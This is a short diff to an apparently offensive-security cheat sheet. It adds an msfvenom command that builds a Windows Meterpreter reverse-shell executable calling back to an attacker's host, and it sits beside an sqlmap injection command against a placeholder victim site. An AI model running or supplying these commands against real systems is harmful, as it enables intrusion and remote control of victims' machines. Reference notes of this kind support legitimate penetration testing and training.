@@ -800,4 +800,8 @@ db_rebuild_cache
 ```
 sqlmap -u 'http://victim.site/view.php?id=1141' -p id --technique=U
 ```
+## Msfvenom
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
+```
 ## How to replicate to otbain access again:
